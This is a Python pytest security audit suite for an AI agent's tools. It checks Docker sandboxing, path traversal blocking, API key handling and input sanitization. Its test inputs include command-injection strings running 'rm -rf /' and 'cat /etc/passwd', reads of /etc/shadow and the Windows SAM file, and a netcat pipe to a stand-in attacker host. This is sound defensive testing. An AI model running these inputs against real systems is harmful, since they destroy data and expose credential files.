"""
Security Audit Suite for KAI Agent Integration

This module performs comprehensive security testing including Docker isolation,
path validation, API key security, and input sanitization.

Requirements: Security NFRs from requirements.md
"""

import os
import re
import sys
from pathlib import Path

import pytest

# Add Agent directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__)))


class TestDockerIsolation:
    """Verify Docker isolation and security (Requirement 5)"""

    def test_dockerfile_uses_unprivileged_user(self):
        """Test Dockerfile creates and uses unprivileged user (Requirement 5.2)"""
        dockerfile_path = Path(__file__).parent / "sandbox" / "Dockerfile"

        if not dockerfile_path.exists():
            pytest.skip("Dockerfile not found")

        content = dockerfile_path.read_text()

        # Should create a non-root user
        assert "useradd" in content or "adduser" in content, \
            "Dockerfile should create a non-root user"

        # Should switch to non-root user
        user_lines = [line for line in content.split(
            '\n') if line.strip().startswith('USER')]
        assert len(user_lines) > 0, "Dockerfile should have USER directive"

        # Last USER directive should not be root
        last_user = user_lines[-1]
        assert "root" not in last_user.lower() or "USER root" not in last_user, \
            "Dockerfile should not run as root user"

        print("\n✓ Dockerfile uses unprivileged user")
        print(f"  User directives found: {user_lines}")

    def test_dockerfile_security_best_practices(self):
        """Test Dockerfile follows security best practices"""
        dockerfile_path = Path(__file__).parent / "sandbox" / "Dockerfile"

        if not dockerfile_path.exists():
            pytest.skip("Dockerfile not found")

        content = dockerfile_path.read_text()

        # Should not expose unnecessary ports
        expose_lines = [
            line for line in content.split('\n') if 'EXPOSE' in line]
        print(
            f"\n✓ Exposed ports: {
                expose_lines if expose_lines else 'None (good)'}")

        # Should use specific base image version (not 'latest')
        from_line = [line for line in content.split(
            '\n') if line.strip().startswith('FROM')][0]
        assert 'latest' not in from_line.lower(), \
            "Should use specific image version, not 'latest'"

        print(f"✓ Uses specific base image: {from_line}")

    def test_docker_execution_isolation(self):
        """Test Docker containers run with proper isolation (Requirement 5.3)"""
        try:
            from agent.tools.execution_tools import execute_python_code_in_sandbox

            # Test that code runs in isolated environment
            code = """
import os
print(f"User: {os.getuid()}")
print(f"Home: {os.path.expanduser('~')}")
"""

            result = execute_python_code_in_sandbox(code)

            # Should not be running as root (uid 0)
            assert "User: 0" not in result, "Container should not run as root"

            print("\n✓ Docker container runs as non-root user")

        except Exception as e:
            pytest.skip(f"Docker not available: {e}")

    def test_docker_network_isolation(self):
        """Test Docker containers have network disabled by default (Requirement 5.3)"""
        try:
            from agent.tools.execution_tools import execute_python_code_in_sandbox

            # Try to access network (should fail)
            code = """
import socket
try:
    socket.create_connection(("google.com", 80), timeout=2)
    print("NETWORK_ACCESSIBLE")
except:
    print("NETWORK_BLOCKED")
"""

            result = execute_python_code_in_sandbox(code)

            # Network should be blocked
            assert "NETWORK_BLOCKED" in result or "error" in result.lower(), \
                "Network should be disabled in sandbox"

            print("\n✓ Docker network isolation working")

        except Exception as e:
            pytest.skip(f"Docker not available: {e}")

    def test_docker_container_cleanup(self):
        """Test Docker containers are cleaned up after execution (Requirement 5.4)"""
        try:
            import docker

            from agent.tools.execution_tools import execute_python_code_in_sandbox

            client = docker.from_env()

            # Get initial container count
            initial_count = len(
                client.containers.list(
                    all=True, filters={
                        "ancestor": "kai-agent-sandbox"}))

            # Execute code
            execute_python_code_in_sandbox("print('test')")

            # Check container count after execution
            final_count = len(
                client.containers.list(
                    all=True, filters={
                        "ancestor": "kai-agent-sandbox"}))

            # Should not have more containers (cleanup should happen)
            assert final_count <= initial_count + 1, \
                "Containers not being cleaned up properly"

            print(
                f"\n✓ Docker cleanup working (containers: {initial_count} -> {final_count})")

        except Exception as e:
            pytest.skip(f"Docker not available: {e}")


class TestPathValidation:
    """Test path validation and directory traversal prevention (Requirement 6)"""

    def test_directory_traversal_prevention_write(self):
        """Test write_file prevents directory traversal (Requirement 6.3)"""
        from agent.tools.coding_tools import write_file

        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "../../sensitive.txt",
            "../outside.txt",
            "./../../../etc/hosts"
        ]

        for path in dangerous_paths:
            result = write_file(path, "malicious content")

            # Should be rejected
            assert any(keyword in result.lower() for keyword in
                       ["nicht erlaubt", "not allowed", "invalid", "fehler", "error"]), \
                f"Path traversal not blocked for: {path}"

        print("\n✓ Directory traversal prevention working for write operations")
        print(f"  Tested {len(dangerous_paths)} dangerous paths")

    def test_directory_traversal_prevention_read(self):
        """Test read_file prevents directory traversal (Requirement 6.3)"""
        from agent.tools.coding_tools import read_file

        dangerous_paths = [
            "../../../etc/passwd",
            "../../sensitive.txt",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM"
        ]

        for path in dangerous_paths:
            result = read_file(path)

            # Should be rejected or return error
            assert any(keyword in result.lower() for keyword in
                       ["nicht erlaubt", "not allowed", "fehler", "error", "nicht gefunden"]), \
                f"Path traversal not blocked for: {path}"

        print("\n✓ Directory traversal prevention working for read operations")

    def test_absolute_path_rejection(self):
        """Test absolute paths are rejected (Requirement 6.1)"""
        from agent.tools.coding_tools import write_file

        absolute_paths = [
            "/tmp/test.txt",
            "C:\\temp\\test.txt",
            "/home/user/test.txt",
            "C:\\Users\\test.txt"
        ]

        for path in absolute_paths:
            result = write_file(path, "test")

            # Should be rejected
            assert any(keyword in result.lower() for keyword in
                       ["nicht erlaubt", "not allowed", "invalid", "fehler", "error"]), \
                f"Absolute path not blocked: {path}"

        print("\n✓ Absolute path rejection working")

    def test_symlink_prevention(self):
        """Test symbolic links cannot be used to escape workspace"""
        from agent.tools.coding_tools import get_workspace_path, write_file

        workspace = get_workspace_path()

        # Try to create a file with suspicious name
        result = write_file("link_to_etc", "test")

        # Should succeed (it's just a filename)
        # But verify it's actually in workspace
        if "erfolgreich" in result.lower() or "success" in result.lower():
            created_file = workspace / "link_to_etc"
            assert created_file.exists()
            assert workspace in created_file.parents or created_file.parent == workspace

        print("\n✓ Files are created within workspace only")

    def test_workspace_isolation(self):
        """Test all operations are restricted to workspace (Requirement 6.1)"""
        from agent.tools.coding_tools import get_workspace_path, list_files, write_file

        workspace = get_workspace_path()

        # Verify workspace exists
        assert workspace.exists(), "Workspace should exist"

        # Verify workspace is in expected location
        assert "agent_workspace" in str(workspace), \
            "Workspace should be in agent_workspace directory"

        # Test that operations work within workspace
        write_file("test_isolation.txt", "test content")
        files = list_files(".")

        assert "test_isolation.txt" in files

        print("\n✓ Workspace isolation working")
        print(f"  Workspace: {workspace}")


class TestAPIKeySecurity:
    """Test API key security measures (Requirement 12)"""

    def test_api_keys_loaded_from_env_only(self):
        """Test API keys are loaded from environment only (Requirement 12.1)"""
        config_file = Path(__file__).parent / "agent" / "config.py"

        content = config_file.read_text()

        # Should not contain hardcoded API keys
        assert "sk-" not in content, "Hardcoded OpenAI key found"
        assert not re.search(r'OPENAI_API_KEY\s*=\s*["\'][^"\']+["\']', content), \
            "Hardcoded API key assignment found"

        # Should use os.getenv or similar
        assert "os.getenv" in content or "os.environ" in content, \
            "Should load keys from environment"

        print("\n✓ API keys loaded from environment only")

    def test_api_keys_not_in_logs(self):
        """Test API keys are not exposed in logs (Requirement 12.2)"""
        import contextlib
        import io

        # Capture stdout
        f = io.StringIO()
        with contextlib.redirect_stdout(f):
            # Import config (might print during import)
            import importlib

            from agent import config as agent_config
            importlib.reload(agent_config)

        output = f.getvalue()

        # Should not contain API key patterns
        assert "sk-" not in output, "OpenAI key pattern in output"
        assert "tvly-" not in output, "Tavily key pattern in output"
        assert not re.search(r'[A-Za-z0-9]{32,}', output), \
            "Long alphanumeric string (possible key) in output"

        print("\n✓ API keys not exposed in logs")

    def test_env_file_in_gitignore(self):
        """Test .env file is in .gitignore (Requirement 12.3)"""
        gitignore_path = Path(__file__).parent.parent / ".gitignore"

        if not gitignore_path.exists():
            pytest.skip(".gitignore not found")

        content = gitignore_path.read_text()

        # Should ignore .env file
        assert ".env" in content, ".env should be in .gitignore"

        print("\n✓ .env file is in .gitignore")

    def test_env_example_has_no_real_keys(self):
        """Test .env.example doesn't contain real API keys"""
        env_example = Path(__file__).parent.parent / ".env.example"

        if not env_example.exists():
            pytest.skip(".env.example not found")

        content = env_example.read_text()

        # Should have placeholder values, not real keys
        lines = content.split('\n')
        for line in lines:
            if '=' in line and not line.strip().startswith('#'):
                key, value = line.split('=', 1)
                value = value.strip()

                # Real keys are typically 32+ characters
                if len(value) > 32:
                    # Should contain placeholder indicators
                    assert any(indicator in value.lower() for indicator in
                               ['your', 'xxx', '...', 'key', 'here', 'placeholder']), \
                        f"Possible real API key in .env.example: {key}"

        print("\n✓ .env.example contains only placeholders")

    def test_api_key_validation_on_startup(self):
        """Test API keys are validated on startup (Requirement 12.3)"""

        # Config should have validation logic
        config_file = Path(__file__).parent / "agent" / "config.py"
        content = config_file.read_text()

        # Should check for missing keys
        assert "OPENAI_API_KEY" in content
        assert "TAVILY_API_KEY" in content

        print("\n✓ API key validation present in config")


class TestInputSanitization:
    """Test input sanitization and validation (Requirement 12.1)"""

    def test_file_path_sanitization(self):
        """Test file paths are sanitized"""
        from agent.tools.coding_tools import write_file

        malicious_inputs = [
            "'; rm -rf /; echo '",
            "$(rm -rf /)",
            "`rm -rf /`",
            "test.txt && rm -rf /",
            "test.txt; cat /etc/passwd"
        ]

        for malicious_input in malicious_inputs:
            result = write_file(malicious_input, "test")

            # Should either reject or sanitize
            # At minimum, should not execute commands
            assert isinstance(result, str), "Should return string result"

        print("\n✓ File path sanitization working")

    def test_code_execution_input_validation(self):
        """Test code execution validates input"""
        try:
            from agent.tools.execution_tools import execute_python_code_in_sandbox

            # Test with various inputs
            test_cases = [
                "",  # Empty
                "   ",  # Whitespace only
                "print('hello')",  # Valid
            ]

            for code in test_cases:
                result = execute_python_code_in_sandbox(code)
                # Should handle all cases without crashing
                assert isinstance(result, str)

            print("\n✓ Code execution input validation working")

        except Exception as e:
            pytest.skip(f"Docker not available: {e}")

    def test_command_injection_prevention(self):
        """Test command injection is prevented"""
        from agent.tools.coding_tools import write_file

        injection_attempts = [
            "test.txt; cat /etc/passwd",
            "test.txt && whoami",
            "test.txt | nc attacker.com 1234",
            "test.txt`whoami`"
        ]

        for attempt in injection_attempts:
            result = write_file(attempt, "test")

            # Should not execute commands
            # Result should not contain command output
            assert "root:" not in result  # /etc/passwd content
            assert "uid=" not in result  # whoami output

        print("\n✓ Command injection prevention working")


class TestSecurityConfiguration:
    """Test security configuration and settings"""

    def test_docker_resource_limits(self):
        """Test Docker containers have resource limits"""
        execution_tools_file = Path(
            __file__).parent / "agent" / "tools" / "execution_tools.py"

        if not execution_tools_file.exists():
            pytest.skip("execution_tools.py not found")

        content = execution_tools_file.read_text()

        # Should have timeout configuration
        assert "timeout" in content.lower(), "Should have timeout configuration"

        print("\n✓ Docker resource limits configured")

    def test_security_module_exists(self):
        """Test security module exists with validation functions"""
        security_file = Path(__file__).parent / "agent" / "security.py"

        if not security_file.exists():
            pytest.skip("security.py not found")

        content = security_file.read_text()

        # Should have validation functions
        assert "validate" in content.lower() or "sanitize" in content.lower(), \
            "Should have validation/sanitization functions"

        print("\n✓ Security module exists with validation functions")

    def test_error_messages_dont_leak_info(self):
        """Test error messages don't leak sensitive information"""
        from agent.tools.coding_tools import read_file

        # Try to read non-existent file
        result = read_file("nonexistent_file_12345.txt")

        # Error message should not reveal full system paths
        assert "/home/" not in result or "agent_workspace" in result
        assert "C:\\" not in result or "agent_workspace" in result

        # Should not reveal internal structure
        assert "__pycache__" not in result

        print("\n✓ Error messages don't leak sensitive information")


def run_security_audit():
    """Run complete security audit and generate report"""
    print("=" * 70)
    print("KAI AGENT - SECURITY AUDIT")
    print("=" * 70)

    # Run pytest with verbose output
    pytest_args = [
        __file__,
        "-v",
        "--tb=short",
        "-W", "ignore::DeprecationWarning",
        "-s"  # Show print statements
    ]

    result = pytest.main(pytest_args)

    print("\n" + "=" * 70)
    if result == 0:
        print("✓ ALL SECURITY TESTS PASSED")
        print("\nSecurity Audit Summary:")
        print("  ✓ Docker isolation verified")
        print("  ✓ Path validation working")
        print("  ✓ API key security confirmed")
        print("  ✓ Input sanitization active")
    else:
        print("✗ SECURITY ISSUES FOUND - Review output above")
    print("=" * 70)

    return result


if __name__ == "__main__":
    sys.exit(run_security_audit())
